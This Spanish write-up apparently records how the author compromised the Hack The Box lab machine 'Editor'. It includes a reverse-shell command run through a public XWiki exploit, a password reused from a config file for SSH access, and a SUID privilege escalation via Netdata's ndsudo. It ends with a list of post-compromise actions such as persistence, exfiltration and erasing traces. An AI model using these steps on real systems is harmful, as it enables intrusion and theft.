# Writeup - HTB "Editor"

## 1. Reconocimiento inicial

### Ping

```bash
ping 10.10.11.80
```

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.80
```

#### Puertos abiertos encontrados:

* **22/tcp** - SSH
* **80/tcp** - HTTP
* **8080/tcp** - HTTP-Proxy

### Detección de versiones

```bash
nmap -p22,80,8080 -sCV 10.10.11.80
```

#### Resultados relevantes:

* **22/tcp**: `OpenSSH 9.6p1 Ubuntu 3ubuntu13.11`
* **80/tcp**: `nginx 1.24.0 (Ubuntu)`
* *80/tcp**: `nginx 1.24.0 (Ubuntu)`

---

## 2. Enumeración web

### Modificación de `/etc/hosts`

Se añadió la siguiente entrada para poder acceder al sitio:

```
10.10.11.80 editor.htb
```

Al explorar la web principal, **no se encontró nada relevante**.

### Enumeración de subdominios

```bash
wfuzz -c \
  -z file,/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt \
  -u http://10.10.11.80/ \
  -H "Host: FUZZ.editor.htb" \
  --hc 404 \
  --hh 154 \
  -t 40

```

Se descubrió un subdominio interesante: **`wiki.editor.htb`**

---

Encontre esta pagina de wiki donde encontre que la version es XWiki Debian 15.10.8

Investigando sobre esta version enocntre una vulneravilidad CVE-2025-24893

con esta vulneravilidad busque exploits y encontre este https://github.com/gunzf0x/CVE-2025-24893.git

ejecutando este script y poneindome en escucha logre conectarme a el equipo mendiante una reverse shell

$ python3 CVE-2025-24893.py -t 'http://example.com:8080' -c 'busybox nc 10.10.10.10 9001 -e /bin/bash'

nc -lvnp 9001

una vez conectado explore un poco dentro de los archivos queme permitia el suuario XWiki, pero no encontre ninguna bandera. pero encontre que en /home existe un directorio llamado oliver

Preguntando a chatgpt sobre la configuracion de XWiki me ha dado un posible directorio donde podria encontrar posibles credenciales

/usr/lib/xwiki/WEB-INF

revisando entre los archivos de esta carpeta encontre el archivo

hibernate.cfg.xml 

donde encontre unas credenciales

<property name="hibernate.connection.password">theEd1t0rTeam99</property>

y las probare con el usuario oliver

ssh oliver@editor.htb

acceso exitoso

ahora me muevo al directorio del suario oliver y encuentro un archivo user.txt

encontre la primera flag

busque por archivos con permisos para continuar con la intruccion

find / -perm -4000 -type f 2>/dev/null

encontre un archvo con permisos con la posibilidad de ser explotado para obtener acceso root

/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

buscando sobre este archivo con permisos root encontre que es vulnerable CVE-2024-32019

Encontre un exploit para explotar la vulneravilidad en https://github.com/AliElKhatteb/CVE-2024-32019-POC

con el archivo exploit.c lo ejecute

x86_64-linux-gnu-gcc -o nvme exploit.c -static


## 8. Post-Explotación

📌 Acciones posibles tras obtener acceso como **root**:

- ✅ Establecer persistencia
- 👤 Crear usuario oculto
- 🔐 Añadir clave pública SSH
- 📦 Exfiltrar información sensible
- 🌐 Explorar red interna
- 🔀 Pivoting hacia otras máquinas
- 🧹 Eliminar huellas
- 💣 Destruir el sistema (⚠️ no recomendado)
---
